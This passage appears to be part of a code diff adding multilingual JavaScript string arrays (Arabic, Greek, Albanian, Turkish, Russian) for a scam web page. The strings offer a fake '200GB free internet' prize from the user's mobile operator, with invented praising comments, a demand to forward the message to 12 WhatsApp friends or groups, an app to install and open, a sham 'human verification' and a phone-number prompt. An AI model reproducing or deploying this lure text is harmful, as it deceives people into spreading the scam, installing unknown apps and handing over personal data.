\u0627\u0644\u062D\u0642\u064A\u0642\u064A\u0629", "\u0627\u0644\u062A\u0648\u0627\u0635\u0644 \u0645\u0639 \u0627\u0644\u0645\u0634\u063A\u0644 \u0627\u0644\u062E\u0627\u0635 \u0628\u0643", "\u0623\u0643\u0645\u0644 \u0647\u0630\u0647 \u0627\u0644\u062E\u0637\u0648\u0627\u062A \u0627\u0644\u062B\u0644\u0627\u062B", "\u0625\u0631\u0633\u0627\u0644", " \u0627\u0646\u0647\u0627 \u0641\u064A \u0642\u0627\u0626\u0645\u062A\u0646\u0627. \u064A\u0631\u062C\u0649 \u0625\u062F\u062E\u0627\u0644 \u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062A\u0641 \u0627\u0644\u062E\u0627\u0635 \u0628\u0643", "\u0645\u062D\u0627\u0641\u0638\u0629 ", "\u0634\u0643\u0631\u0627 \u0644\u0643 \u060C \u0644\u0642\u062F \u062A\u062D\u0642\u0642\u0646\u0627 \u0628\u0627\u0644\u0641\u0639\u0644", "\u0627\u0641\u062D\u0635\u0647\u0627", " 100 \u062C\u064A\u062C\u0627\u0628\u0627\u064A\u062A \u0645\u062C\u0627\u0646\u064B\u0627", "\u062A\u062D\u0642\u0642 \u0645\u0645\u0627 \u0625\u0630\u0627 \u062A\u0645 \u0627\u062E\u062A\u064A\u0627\u0631 \u0645\u0646\u0637\u0642\u062A\u0643 \u0645\u0646 \u0623\u062C\u0644", "\u0627\u0644\u0628\u0642\u0627\u0621 \u0641\u064A \u0627\u0644\u0645\u0646\u0632\u0644", "\u0625\u0646\u062A\u0631\u0646\u062A \u0645\u062C\u0627\u0646\u064A 4G: 200GB"] :
+            "el" === language ? window.words = ["\u0391\u03C0\u03AC\u03BD\u03C4\u03B7\u03C3\u03B7", "\u039C\u03BF\u03C5 \u03B1\u03C1\u03AD\u03C3\u03B5\u03B9", "\u0395\u03BD\u03C3\u03C9\u03BC\u03AC\u03C4\u03C9\u03C3\u03B7 \u03B1\u03C1\u03BA\u03B5\u03C4\u03AC \u03B5\u03CD\u03BA\u03BF\u03BB\u03B7. \u039C\u03BF\u03B9\u03C1\u03AC\u03C3\u03C4\u03B7\u03BA\u03B5 \u03B1\u03C0\u03CC \u03BC\u03B5\u03C1\u03B9\u03BA\u03BF\u03CD\u03C2 \u03C0\u03C1\u03BF\u03C3\u03C9\u03C0\u03B9\u03BA\u03BF\u03CD\u03C2 \u03C6\u03AF\u03BB\u03BF\u03C5\u03C2.", "\u03B3\u03C1\u03AC\u03C6\u03B5\u03B9\u03C2 \u03AD\u03BD\u03B1 \u03C3\u03C7\u03CC\u03BB\u03B9\u03BF ...", "\u0391\u03C0\u03AC\u03BD\u03C4\u03B7\u03C3\u03B7", "\u039C\u03BF\u03C5 \u03B1\u03C1\u03AD\u03C3\u03B5\u03B9", "\u03A3\u03B5 \u03B1\u03C5\u03C4\u03AD\u03C2 \u03C4\u03B9\u03C2 \u03B4\u03CD\u03C3\u03BA\u03BF\u03BB\u03B5\u03C2 \u03C3\u03C4\u03B9\u03B3\u03BC\u03AD\u03C2 \u03B5\u03AF\u03BD\u03B1\u03B9 \u03B1\u03C0\u03B1\u03C1\u03B1\u03AF\u03C4\u03B7\u03C4\u03BF", "\u0391\u03C0\u03AC\u03BD\u03C4\u03B7\u03C3\u03B7", "\u039C\u03BF\u03C5 \u03B1\u03C1\u03AD\u03C3\u03B5\u03B9", "\u03A0\u03C1\u03B1\u03B3\u03BC\u03B1\u03C4\u03B9\u03BA\u03AC, \u03B5\u03C5\u03C7\u03B1\u03C1\u03B9\u03C3\u03C4\u03CE \u03C0\u03BF\u03C5 \u03C4\u03BF \u03BC\u03BF\u03B9\u03C1\u03B1\u03C3\u03C4\u03AE\u03BA\u03B1\u03C4\u03B5 \u03BC\u03B1\u03B6\u03AF \u03BC\u03B1\u03C2", "\u0391\u03C0\u03AC\u03BD\u03C4\u03B7\u03C3\u03B7", "\u039C\u03BF\u03C5 \u03B1\u03C1\u03AD\u03C3\u03B5\u03B9", "\u0388\u03BB\u03B5\u03B3\u03BE\u03B1 \u03C4\u03B7\u03BD \u03C0\u03CC\u03BB\u03B7 \u03BC\u03BF\u03C5, \u03AE\u03BC\u03BF\u03C5\u03BD \u03C0\u03B1\u03C1\u03CE\u03BD. \u03A3\u03B1\u03C2 \u03B5\u03C5\u03C7\u03B1\u03C1\u03B9\u03C3\u03C4\u03BF\u03CD\u03BC\u03B5 \u03C0\u03BF\u03C5 \u03BC\u03B1\u03C2 \u03B5\u03BE\u03B5\u03C4\u03AC\u03C3\u03B1\u03C4\u03B5.", "\u0391\u03C0\u03AC\u03BD\u03C4\u03B7\u03C3\u03B7", "\u039C\u03BF\u03C5 \u03B1\u03C1\u03AD\u03C3\u03B5\u03B9", "\u0395\u03C5\u03C7\u03B1\u03C1\u03B9\u03C3\u03C4\u03CE, \u03C0\u03C1\u03B1\u03B3\u03BC\u03B1\u03C4\u03B9\u03BA\u03AC, \u03BB\u03B5\u03B9\u03C4\u03BF\u03C5\u03C1\u03B3\u03B5\u03AF \u03C4\u03AD\u03BB\u03B5\u03B9\u03B1.", "\u03A3\u03C7\u03CC\u03BB\u03B9\u03BF", "\u039C\u03BF\u03C5 \u03B1\u03C1\u03AD\u03C3\u03B5\u03B9", "\u03B4\u03C1\u03AC\u03C3\u03B5\u03B9\u03C2", "\u03C3\u03C7\u03CC\u03BB\u03B9\u03B1", "153\u039A", "ANDROID", "IPONE", "\u03A4\u03CE\u03C1\u03B1 \u03B5\u03C0\u03B9\u03BB\u03AD\u03BE\u03C4\u03B5 \u03C4\u03B7\u03BD \u03BA\u03B9\u03BD\u03B7\u03C4\u03AE \u03C3\u03C5\u03C3\u03BA\u03B5\u03C5\u03AE \u03C3\u03B1\u03C2.", "(\u0398\u03C5\u03BC\u03B7\u03B8\u03B5\u03AF\u03C4\u03B5 \u03CC\u03C4\u03B9 \u03B1\u03C5\u03C4\u03CC \u03C4\u03BF \u03B2\u03AE\u03BC\u03B1 \u03B5\u03AF\u03BD\u03B1\u03B9 \u03C3\u03B7\u03BC\u03B1\u03BD\u03C4\u03B9\u03BA\u03CC \u03B3\u03B9\u03B1 \u03BD\u03B1 \u03BB\u03B5\u03B9\u03C4\u03BF\u03C5\u03C1\u03B3\u03B5\u03AF \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C4\u03BF \u0394\u03B9\u03B1\u03B4\u03AF\u03BA\u03C4\u03C5\u03BF).", "1. \u0398\u03B1 \u03C0\u03C1\u03AD\u03C0\u03B5\u03B9 \u03BD\u03B1 \u03B5\u03B3\u03BA\u03B1\u03C4\u03B1\u03C3\u03C4\u03AE\u03C3\u03B5\u03C4\u03B5 \u03C4\u03B7\u03BD \u03B5\u03C6\u03B1\u03C1\u03BC\u03BF\u03B3\u03AE \u03C0\u03B1\u03C1\u03B1\u03BA\u03AC\u03C4\u03C9 \u03C0\u03CC\u03C4\u03B5 \u03BA\u03B1\u03B9 \u03C0\u03CC\u03C4\u03B5 \u03B5\u03AF\u03BD\u03B1\u03B9 \u03B5\u03B3\u03BA\u03B1\u03C4\u03B5\u03C3\u03C4\u03B7\u03BC\u03AD\u03BD\u03B7, \u03B8\u03B1 \u03C0\u03C1\u03AD\u03C0\u03B5\u03B9 \u03BD\u03B1 \u03C4\u03B7\u03BD \u03B1\u03BD\u03BF\u03AF\u03BE\u03B5\u03C4\u03B5 \u03B3\u03B9\u03B1 30 \u03B4\u03B5\u03C5\u03C4\u03B5\u03C1\u03CC\u03BB\u03B5\u03C0\u03C4\u03B1.", "\u0393\u03B9\u03B1 \u03BD\u03B1 \u03B5\u03BD\u03B5\u03C1\u03B3\u03BF\u03C0\u03BF\u03B9\u03AE\u03C3\u03B5\u03C4\u03B5 \u03C4\u03BF \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03B4\u03B9\u03B1\u03B4\u03AF\u03BA\u03C4\u03C5\u03BF, \u03C0\u03C1\u03AD\u03C0\u03B5\u03B9 \u03BD\u03B1 \u03BF\u03BB\u03BF\u03BA\u03BB\u03B7\u03C1\u03CE\u03C3\u03B5\u03C4\u03B5 \u03B1\u03C5\u03C4\u03CC \u03C4\u03BF \u03C4\u03B5\u03BB\u03B9\u03BA\u03CC \u03C4\u03B5\u03BB\u03B9\u03BA\u03CC \u03B2\u03AE\u03BC\u03B1 \u03C4\u03B7\u03C2 \u0395\u03C0\u03B1\u03BB\u03AE\u03B8\u03B5\u03C5\u03C3\u03B7\u03C2 \u0391\u03BD\u03B8\u03C1\u03CE\u03C0\u03BF\u03C5!", "\u03A3\u03C5\u03B3\u03C7\u03B1\u03C1\u03B7\u03C4\u03AE\u03C1\u03B9\u03B1, \u03BA\u03B5\u03C1\u03B4\u03AF\u03C3\u03B1\u03C4\u03B5 200GB \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD internet", "\u039C\u03BF\u03B9\u03C1\u03B1\u03C3\u03C4\u03B5\u03AF\u03C4\u03B5 \u03BC\u03B5 \u03C4\u03BF\u03C5\u03C2 \u03C6\u03AF\u03BB\u03BF\u03C5\u03C2 \u03C3\u03B1\u03C2", "\u039C\u03B5\u03C4\u03AC \u03C4\u03B7\u03BD \u03BA\u03BF\u03B9\u03BD\u03AE \u03C7\u03C1\u03AE\u03C3\u03B7, \u03B8\u03B1 \u03C0\u03C1\u03BF\u03C7\u03C9\u03C1\u03AE\u03C3\u03B5\u03C4\u03B5 \u03C3\u03C4\u03BF \u03B5\u03C0\u03CC\u03BC\u03B5\u03BD\u03BF \u03B2\u03AE\u03BC\u03B1, \u03CE\u03C3\u03C4\u03B5 \u03BD\u03B1 \u03BC\u03C0\u03BF\u03C1\u03B5\u03AF\u03C4\u03B5 \u03BD\u03B1 \u03B5\u03BD\u03B5\u03C1\u03B3\u03BF\u03C0\u03BF\u03B9\u03AE\u03C3\u03B5\u03C4\u03B5 \u03B1\u03C5\u03C4\u03AE\u03BD \u03C4\u03B7 \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C5\u03C0\u03B7\u03C1\u03B5\u03C3\u03AF\u03B1 \u0394\u03B9\u03B1\u03B4\u03B9\u03BA\u03C4\u03CD\u03BF\u03C5 \u03B3\u03B9\u03B1 60 \u03B7\u03BC\u03AD\u03C1\u03B5\u03C2.", "\u0393\u03B9\u03B1 \u03BD\u03B1 \u03BC\u03C0\u03BF\u03C1\u03AD\u03C3\u03B5\u03C4\u03B5 \u03BD\u03B1 \u03B5\u03BD\u03B5\u03C1\u03B3\u03BF\u03C0\u03BF\u03B9\u03AE\u03C3\u03B5\u03C4\u03B5 \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C4\u03BF \u0394\u03B9\u03B1\u03B4\u03AF\u03BA\u03C4\u03C5\u03BF, \u03BA\u03AC\u03BD\u03C4\u03B5 \u03C0\u03C1\u03CE\u03C4\u03B1 \u03BA\u03BB\u03B9\u03BA \u03C3\u03C4\u03BF \u03C0\u03C1\u03AC\u03C3\u03B9\u03BD\u03BF \u03BA\u03BF\u03C5\u03BC\u03C0\u03AF\" WHATSAPP \"\u03BA\u03B1\u03B9 \u03C3\u03C4\u03B5\u03AF\u03BB\u03C4\u03B5 \u03B1\u03C5\u03C4\u03AC \u03C4\u03B1 \u03BD\u03AD\u03B1 \u03C3\u03B5 12 \u03C6\u03AF\u03BB\u03BF\u03C5\u03C2 \u03AE \u03BF\u03BC\u03AC\u03B4\u03B5\u03C2 \u03C3\u03C4\u03BF WhatsApp, \u03CE\u03C3\u03C4\u03B5 \u03BD\u03B1 \u03BC\u03C0\u03BF\u03C1\u03BF\u03CD\u03BD \u03B5\u03C0\u03AF\u03C3\u03B7\u03C2 \u03BD\u03B1 \u03BB\u03AC\u03B2\u03BF\u03C5\u03BD \u03B1\u03C5\u03C4\u03AE\u03BD \u03C4\u03B7\u03BD \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C5\u03C0\u03B7\u03C1\u03B5\u03C3\u03AF\u03B1 \u03BA\u03B1\u03C4\u03AC \u03C4\u03B7 \u03B4\u03B9\u03AC\u03C1\u03BA\u03B5\u03B9\u03B1 \u03B1\u03C5\u03C4\u03AE\u03C2 \u03C4\u03B7\u03C2 \u03BC\u03B1\u03BA\u03C1\u03AC\u03C2 \u03BA\u03B1\u03C1\u03B1\u03BD\u03C4\u03AF\u03BD\u03B1\u03C2!", "\u03A0\u03CE\u03C2 \u03BD\u03B1 \u03B5\u03BD\u03B5\u03C1\u03B3\u03BF\u03C0\u03BF\u03B9\u03AE\u03C3\u03B5\u03C4\u03B5 \u03C4\u03BF \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u0394\u03B9\u03B1\u03B4\u03AF\u03BA\u03C4\u03C5\u03BF;", "\u03A3\u03C5\u03B3\u03C7\u03B1\u03C1\u03B7\u03C4\u03AE\u03C1\u03B9\u03B1, \u03BA\u03B5\u03C1\u03B4\u03AF\u03C3\u03B1\u03C4\u03B5 200GB \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03B1\u03C0\u03CC \u03C4\u03BF\u03BD \u03C0\u03AC\u03C1\u03BF\u03C7\u03BF \u03BA\u03B9\u03BD\u03B7\u03C4\u03AE\u03C2 \u03C4\u03B7\u03BB\u03B5\u03C6\u03C9\u03BD\u03AF\u03B1\u03C2!", "\u03A0\u03B5\u03C1\u03B9\u03BC\u03AD\u03BD\u03B5\u03C4\u03B5 \u03BB\u03AF\u03B3\u03BF, \u03B5\u03C0\u03B9\u03BA\u03C5\u03C1\u03CE\u03BD\u03BF\u03C5\u03BC\u03B5 \u03C4\u03B1 \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03B1.", "\u0397 \u03C0\u03BF\u03BB\u03B9\u03C4\u03B9\u03BA\u03AE \u03BA\u03B1\u03B9 \u03BF\u03B9 \u03CC\u03C1\u03BF\u03B9 \u03B1\u03C0\u03BF\u03C1\u03C1\u03AE\u03C4\u03BF\u03C5 \u03C4\u03C9\u03BD \u03C5\u03C0\u03B7\u03C1\u03B5\u03C3\u03B9\u03CE\u03BD \u03BC\u03B1\u03C2", "\u0394\u03B5\u03BD \u03B5\u03C0\u03B9\u03C4\u03C1\u03AD\u03C0\u03B5\u03C4\u03B1\u03B9 \u03B7 \u03B4\u03B7\u03BC\u03BF\u03C3\u03AF\u03B5\u03C5\u03C3\u03B7 \u03C4\u03B7\u03C2 \u03B5\u03C6\u03B1\u03C1\u03BC\u03BF\u03B3\u03AE\u03C2 \u03C3\u03C4\u03BF Facebook", "\u0391\u03C0\u03BF\u03B4\u03BF\u03C7\u03AE - \u0395\u03AF\u03BC\u03B1\u03B9 \u03AC\u03BD\u03B8\u03C1\u03C9\u03C0\u03BF\u03C2", "\u03A0\u03C1\u03AD\u03C0\u03B5\u03B9 \u03BD\u03B1 \u03B5\u03C0\u03B9\u03B2\u03B5\u03B2\u03B1\u03B9\u03CE\u03C3\u03BF\u03C5\u03BC\u03B5 \u03CC\u03C4\u03B9 \u03B5\u03AF\u03C3\u03C4\u03B5 \u03C0\u03C1\u03B1\u03B3\u03BC\u03B1\u03C4\u03B9\u03BA\u03CC\u03C2 \u03AC\u03BD\u03B8\u03C1\u03C9\u03C0\u03BF\u03C2 \u03B5\u03BB\u03AD\u03B3\u03C7\u03BF\u03BD\u03C4\u03B1\u03C2 \u03C4\u03BF \u03CC\u03BD\u03BF\u03BC\u03B1 \u03BA\u03B1\u03B9 \u03C4\u03B7 \u03C6\u03C9\u03C4\u03BF\u03B3\u03C1\u03B1\u03C6\u03AF\u03B1 \u03C0\u03C1\u03BF\u03C6\u03AF\u03BB \u03C3\u03B1\u03C2.", "\u0391\u03AF\u03C4\u03B7\u03C3\u03B7 \u03AC\u03B4\u03B5\u03B9\u03B1\u03C2", "\u03A0\u03B5\u03C1\u03B9\u03BC\u03AD\u03BD\u03B5\u03C4\u03B5, \u03B5\u03C0\u03B9\u03BA\u03C5\u03C1\u03CE\u03BD\u03BF\u03C5\u03BC\u03B5 \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03B1", "\u0395\u03C0\u03B1\u03BB\u03AE\u03B8\u03B5\u03C5\u03C3\u03B7 \u03C0\u03C1\u03B1\u03B3\u03BC\u03B1\u03C4\u03B9\u03BA\u03AE\u03C2 \u03C4\u03B1\u03C5\u03C4\u03CC\u03C4\u03B7\u03C4\u03B1\u03C2", "\u03A3\u03CD\u03BD\u03B4\u03B5\u03C3\u03B7 \u03BC\u03B5 \u03C4\u03BF\u03BD \u03C7\u03B5\u03B9\u03C1\u03B9\u03C3\u03C4\u03AE \u03C3\u03B1\u03C2", "\u039F\u03BB\u03BF\u03BA\u03BB\u03B7\u03C1\u03CE\u03C3\u03C4\u03B5 \u03B1\u03C5\u03C4\u03AC \u03C4\u03B1 3 \u03B2\u03AE\u03BC\u03B1\u03C4\u03B1", "\u0391\u03C0\u03BF\u03C3\u03C4\u03BF\u03BB\u03AE", " \u03B5\u03AF\u03BD\u03B1\u03B9 \u03C3\u03C4\u03B7 \u03BB\u03AF\u03C3\u03C4\u03B1 \u03BC\u03B1\u03C2. \u0395\u03B9\u03C3\u03B1\u03B3\u03AC\u03B3\u03B5\u03C4\u03B5 \u03C4\u03BF\u03BD \u03B1\u03C1\u03B9\u03B8\u03BC\u03CC \u03C4\u03B7\u03BB\u03B5\u03C6\u03CE\u03BD\u03BF\u03C5 \u03C3\u03B1\u03C2", "\u0397 \u03B5\u03C0\u03B1\u03C1\u03C7\u03AF\u03B1 ", "\u03A3\u03B1\u03C2 \u03B5\u03C5\u03C7\u03B1\u03C1\u03B9\u03C3\u03C4\u03BF\u03CD\u03BC\u03B5, \u03AD\u03C7\u03BF\u03C5\u03BC\u03B5 \u03AE\u03B4\u03B7 \u03B5\u03C0\u03B1\u03BB\u03B7\u03B8\u03B5\u03CD\u03C3\u03B5\u03B9", "\u0394\u03B5\u03AF\u03C4\u03B5 \u03C4\u03BF", " 200GB \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD", "\u0395\u03BB\u03AD\u03B3\u03BE\u03C4\u03B5 \u03B1\u03BD \u03AD\u03C7\u03B5\u03B9 \u03B5\u03C0\u03B9\u03BB\u03B5\u03B3\u03B5\u03AF \u03B7 \u03B6\u03CE\u03BD\u03B7 \u03C3\u03B1\u03C2", "\u039C\u03B5\u03AF\u03BD\u03B5\u03C4\u03B5 \u03C3\u03C4\u03BF \u03C3\u03C0\u03AF\u03C4\u03B9", "\u0394\u03C9\u03C1\u03B5\u03AC\u03BD \u0394\u03B9\u03B1\u03B4\u03AF\u03BA\u03C4\u03C5\u03BF : 200GB"] :
+                "sq" === language ? window.words = ["Response", "M\xEB p\xEBlqen", "Integrimi mjaft i leht\xEB. Ajo u nda nga disa miq personal\xEB.", "ju jeni duke shkruar nj\xEB koment ...", "P\xEBrgjigju", "M\xEB p\xEBlqen", "N\xEB k\xEBto periudha t\xEB v\xEBshtira \xEBsht\xEB e nevojshme.", "P\xEBrgjigju", "M\xEB p\xEBlqen", "Me t\xEB v\xEBrtet\xEB, faleminderit q\xEB ndau k\xEBt\xEB me ne.", "P\xEBrgjigju", "M\xEB p\xEBlqen", "Kontrolloj qytetin tim, kam qen\xEB i pranish\xEBm. Faleminderit q\xEB na konsiderove. ", "P\xEBrgjigju", "M\xEB p\xEBlqen", "Faleminderit, me t\xEB v\xEBrtet\xEB, funksionon n\xEB m\xEBnyr\xEB t\xEB p\xEBrsosur.", "Comment fush\xEB", "M\xEB p\xEBlqen", "Veprimet", "Komente", "153K", "ANDROID", "IPONE", "Tani zgjidhni pajisjen tuaj celular.", "(Mos harroni se ky hap \xEBsht\xEB i r\xEBnd\xEBsish\xEBm p\xEBr t\xEB punuar n\xEB internet falas).", "1. Ju duhet ta instaloni aplikacionin m\xEB posht\xEB kur dhe kur \xEBsht\xEB instaluar, duhet ta hapni at\xEB p\xEBr 30 sekonda. ", "P\xEBr t\xEB aktivizuar internetin falas, duhet ta kryeni k\xEBt\xEB hap t\xEB fundit p\xEBrfundimtar t\xEB Verifikimit Njer\xEBzor!", "Urime, fitove 200GB internet falas", "Ndani me miqt\xEB tuaj", "Pas ndarjes, ju do t\xEB shkoni n\xEB hapin tjet\xEBr q\xEB t\xEB mund ta aktivizoni k\xEBt\xEB sh\xEBrbim falas t\xEB internetit p\xEBr 60 dit\xEB.", "P\xEBr t\xEB qen\xEB n\xEB gjendje t\xEB aktivizoni Internetin falas, klikoni s\xEB pari n\xEB butonin \"WHATSAPP\" t\xEB gjelb\xEBr dhe d\xEBrgoni k\xEBt\xEB lajm p\xEBr 12 miq ose grupe n\xEB WhatsApp n\xEB m\xEBnyr\xEB q\xEB ata t\xEB mund t\xEB marrin k\xEBt\xEB sh\xEBrbim falas gjat\xEB k\xEBsaj karantine t\xEB gjat\xEB!", "Si t\xEB aktivizoni internetin falas?", "Urime, ju fituat 200GB falas nga operatori juaj celular!", "Prisni nj\xEB moment, ne v\xEBrtetojm\xEB t\xEB dh\xEBnat.", "Politika dhe kushtet e privat\xEBsis\xEB s\xEB sh\xEBrbimit ton\xEB", "Aplikimi nuk lejohet t\xEB postoj\xEB n\xEB Facebook", "Prano - un\xEB jam nj\xEB njeri", "Ne duhet t\xEB v\xEBrtetojm\xEB q\xEB ju jeni nj\xEB njeri i v\xEBrtet\xEB duke kontrolluar emrin dhe foton e profilit tuaj.", "K\xEBrkoni leje", "Prisni, ne po v\xEBrtetojm\xEB t\xEB dh\xEBnat", "Verifikimi i identitetit t\xEB v\xEBrtet\xEB", "Lidhja me operatorin tuaj", "P\xEBrfundoni k\xEBto 3 hapa", "Send", "\xEBsht\xEB n\xEB list\xEBn ton\xEB. Ju lutemi shkruani numrin tuaj t\xEB telefonit ", "Provinca e", "Faleminderit, ne kemi verifikuar tashm\xEB", "Kontrolloni at\xEB", "200GB falas", "Kontrolloni n\xEBse zona juaj \xEBsht\xEB zgjedhur p\xEBr", "Rri n\xEB sht\xEBpi", "Internet falas 4G/5G: 200GB"] :
+                    "tr" === language ? window.words = ["Tepki", "Sevdim", "Entegrasyon olduk\xE7a kolay. Baz\u0131 ki\u015Fisel arkada\u015Flar taraf\u0131ndan payla\u015F\u0131ld\u0131.", "yorum yaz\u0131yorsun ...", "Cevap", "Sevdim", "Bu zor zamanlarda gerekli.", "Cevap", "Sevdim", "Ger\xE7ekten, bunu bizimle payla\u015Ft\u0131\u011F\u0131n i\xE7in te\u015Fekk\xFCrler.", "Cevap", "Sevdim", "\u015Eehrimi kontrol ediyorum, oradayd\u0131m. Bizi d\xFC\u015F\xFCnd\xFC\u011F\xFCn\xFCz i\xE7in te\u015Fekk\xFCr ederim.", "Cevap", "Sevdim", "Te\u015Fekk\xFCrler, ger\xE7ekten, m\xFCkemmel \xE7al\u0131\u015F\u0131yor.", "A\xE7\u0131klama alan\u0131", "Sevdim", "Eylemler", "Yorum", "153K", "ANDROID", "\u0130pone", "\u015Eimdi mobil cihaz\u0131n\u0131z\u0131 se\xE7in.", "(\xDCcretsiz internetin \xE7al\u0131\u015Fmas\u0131 i\xE7in bu ad\u0131m\u0131n \xF6nemli oldu\u011Funu unutmay\u0131n).", "1. Uygulamay\u0131 ne zaman ve ne zaman y\xFCklerseniz y\xFCklemelisiniz, 30 saniye boyunca a\xE7mal\u0131s\u0131n\u0131z. ", "\xDCcretsiz interneti etkinle\u015Ftirmek i\xE7in \u0130nsan Do\u011Frulaman\u0131n bu son ad\u0131m\u0131n\u0131 tamamlamal\u0131s\u0131n\u0131z!", "Tebrikler, 200GB \xFCcretsiz internet kazand\u0131n\u0131z", "Arkada\u015Flar\u0131n\u0131zla payla\u015F\u0131n", "Payla\u015Ft\u0131ktan sonra bir sonraki ad\u0131ma ge\xE7eceksiniz, b\xF6ylece bu \xFCcretsiz internet hizmetini 60 g\xFCn boyunca etkinle\u015Ftirebilirsiniz.", "\u0130nternet i \xFCcretsiz olarak etkinle\u015Ftirmek i\xE7in \xF6nce ye\u015Fil \"PAYLA\u015E\" d\xFC\u011Fmesine t\u0131klay\u0131n ve bu haberi Karantina s\u0131ras\u0131nda bu \xFCcretsiz hizmeti alabilmeleri i\xE7in WhatsApp ta 12 arkada\u015Fa veya gruba g\xF6nderin!", "\xDCcretsiz \u0130nternet nas\u0131l etkinle\u015Ftirilir?", "Tebrikler, mobil operat\xF6r\xFCn\xFCzden 200GB \xFCcretsiz kazand\u0131n\u0131z!", "Bir dakika, verileri do\u011Frular\u0131z.", "Hizmet gizlilik politikam\u0131z ve ko\u015Fullar\u0131m\u0131z", "Uygulaman\u0131n Facebook ta yay\u0131n yapmas\u0131na izin verilmiyor", "Kabul et - ben bir insan\u0131m", "Ad\u0131n\u0131z\u0131 ve profil foto\u011Fraf\u0131n\u0131z\u0131 kontrol ederek ger\xE7ek bir insan oldu\u011Funuzu do\u011Frulamal\u0131y\u0131z.", "\u0130zin iste", "Bekleyin, verileri do\u011Frul\u0131yoruz", "Ger\xE7ek kimlik do\u011Frulamas\u0131", "Operat\xF6r\xFCn\xFCzle ba\u011Flant\u0131 kurma", "Bu 3 ad\u0131m\u0131 tamamla", "G\xF6nder", " listemizde. L\xFCtfen telefon numaran\u0131z\u0131 girin", "Eyaleti ", "Te\u015Fekk\xFCrler, zaten do\u011Frulad\u0131k", "\u015Euna bir bak", " 200GB \xFCcretsiz", "B\xF6lgenizin se\xE7ilip se\xE7ilmedi\u011Fini kontrol edin", "Evde Kal\u0131n", "\xDCcretsiz \u0130nternet 4G: 200GB"] :
+                        "ru" === language ? window.words = ["\u041E\u0442\u0432\u0435\u0442", "\u041C\u043D\u0435 \u043D\u0440\u0430\u0432\u0438\u0442\u0441\u044F", "\u0418\u043D\u0442\u0435\u0433\u0440\u0430\u0446\u0438\u044F \u0434\u043E\u0432\u043E\u043B\u044C\u043D\u043E \u043F\u0440\u043E\u0441\u0442\u0430. \u0415\u0433\u043E \u043F\u043E\u0434\u0435\u043B\u0438\u043B\u0438\u0441\u044C \u043D\u0435\u0441\u043A\u043E\u043B\u044C\u043A\u043E \u043B\u0438\u0447\u043D\u044B\u0445 \u0434\u0440\u0443\u0437\u0435\u0439. ", "\u0412\u044B \u043F\u0438\u0448\u0435\u0442\u0435 \u043A\u043E\u043C\u043C\u0435\u043D\u0442\u0430\u0440\u0438\u0439 ...", "\u041E\u0442\u0432\u0435\u0442\u0438\u0442\u044C", "\u041C\u043D\u0435 \u043D\u0440\u0430\u0432\u0438\u0442\u0441\u044F", "\u0412 \u044D\u0442\u0438 \u0442\u0440\u0443\u0434\u043D\u044B\u0435 \u0432\u0440\u0435\u043C\u0435\u043D\u0430 \u044D\u0442\u043E \u043D\u0435\u043E\u0431\u0445\u043E\u0434\u0438\u043C\u043E", "\u041E\u0442\u0432\u0435\u0442\u0438\u0442\u044C", "\u041C\u043D\u0435 \u043D\u0440\u0430\u0432\u0438\u0442\u0441\u044F", "\u0414\u0435\u0439\u0441\u0442\u0432\u0438\u0442\u0435\u043B\u044C\u043D\u043E, \u0441\u043F\u0430\u0441\u0438\u0431\u043E, \u0447\u0442\u043E \u043F\u043E\u0434\u0435\u043B\u0438\u043B\u0438\u0441\u044C \u044D\u0442\u0438\u043C \u0441 \u043D\u0430\u043C\u0438.", "\u041E\u0442\u0432\u0435\u0442\u0438\u0442\u044C", "\u041C\u043D\u0435 \u043D\u0440\u0430\u0432\u0438\u0442\u0441\u044F", "\u042F \u043F\u0440\u043E\u0432\u0435\u0440\u044F\u044E \u0441\u0432\u043E\u0439 \u0433\u043E\u0440\u043E\u0434, \u044F \u043F\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u043E\u0432\u0430\u043B. \u0421\u043F\u0430\u0441\u0438\u0431\u043E, \u0447\u0442\u043E \u0440\u0430\u0441\u0441\u043C\u0430\u0442\u0440\u0438\u0432\u0430\u0435\u0442\u0435 \u043D\u0430\u0441. ", "\u041E\u0442\u0432\u0435\u0442\u0438\u0442\u044C", "\u041C\u043D\u0435 \u043D\u0440\u0430\u0432\u0438\u0442\u0441\u044F", "\u0421\u043F\u0430\u0441\u0438\u0431\u043E, \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0442\u0435\u043B\u044C\u043D\u043E, \u044D\u0442\u043E \u0440\u0430\u0431\u043E\u0442\u0430\u0435\u0442 \u043E\u0442\u043B\u0438\u0447\u043D\u043E.", "\u041A\u043E\u043C\u043C\u0435\u043D\u0442\u0430\u0440\u0438\u0439 \u043F\u043E\u043B\u0435", "\u041C\u043D\u0435 \u043D\u0440\u0430\u0432\u0438\u0442\u0441\u044F", "\u0414\u0435\u0439\u0441\u0442\u0432\u0438\u044F", "\u041A\u043E\u043C\u043C\u0435\u043D\u0442\u0430\u0440\u0438\u0438", "153K", "ANDROID", "Ipone", "\u0422\u0435\u043F\u0435\u0440\u044C \u0432\u044B\u0431\u0435\u0440\u0438\u0442\u0435 \u0432\u0430\u0448\u0435 \u043C\u043E\u0431\u0438\u043B\u044C\u043D\u043E\u0435 \u0443\u0441\u0442\u0440\u043E\u0439\u0441\u0442\u0432\u043E.", "(\u041F\u043E\u043C\u043D\u0438\u0442\u0435, \u044D\u0442\u043E\u0442 \u0448\u0430\u0433 \u0432\u0430\u0436\u0435\u043D \u0434\u043B\u044F \u0440\u0430\u0431\u043E\u0442\u044B \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E\u0433\u043E \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442\u0430).", "1. \u0412\u044B \u0434\u043E\u043B\u0436\u043D\u044B \u0443\u0441\u0442\u0430\u043D\u043E\u0432\u0438\u0442\u044C \u043F\u0440\u0438\u043B\u043E\u0436\u0435\u043D\u0438\u0435 \u043D\u0438\u0436\u0435, 